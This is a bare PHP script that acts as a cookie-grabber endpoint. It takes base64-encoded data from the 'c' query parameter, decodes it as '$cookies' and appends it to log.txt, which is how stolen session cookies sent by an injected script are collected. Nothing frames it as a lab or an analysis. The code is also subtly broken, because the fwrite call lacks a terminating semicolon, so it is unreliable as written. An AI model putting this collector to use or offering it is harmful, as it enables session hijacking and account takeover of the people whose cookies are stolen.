<?php
if(isset($_GET["c"]))
{
    $cookies=base64_decode(urldecode($_GET["c"]));
    $file=fopen('log.txt','a+');
    fwrite($file,$cookies)
}
?>